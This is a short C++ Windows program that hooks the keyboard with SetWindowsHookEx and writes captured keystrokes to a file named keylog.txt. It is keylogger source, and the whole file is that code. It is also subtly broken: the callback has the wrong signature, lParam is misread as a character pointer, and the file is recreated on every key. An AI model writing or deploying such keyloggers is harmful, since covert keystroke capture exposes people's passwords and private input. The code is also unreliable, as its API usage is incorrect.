#include <windows.h>
#include <iostream>

using namespace std;

bool isAltPressed = false;
void onKeyPressed(WPARAM wParam, LPARAM lParam) {
    if (wParam == VK_MENU && GetAsyncKeyState(VK_CONTROL)) {
        isAltPressed = true;
    } else if (isAltPressed && wParam != VK_MENU) {
        isAltPressed = false;
        // Save the key
        HANDLE hFile = CreateFile("keylog.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
            return;

        WriteFile(hFile, (char*)lParam, 1, NULL, NULL);
        CloseHandle(hFile);
    }
}

int main() {
    // Hook the keyboard
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, onKeyPressed, GetModuleHandle(NULL), 0);
    if (!hHook) return -1;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook the keyboard
    UnhookWindowsHookEx(hHook);

    return 0;
}
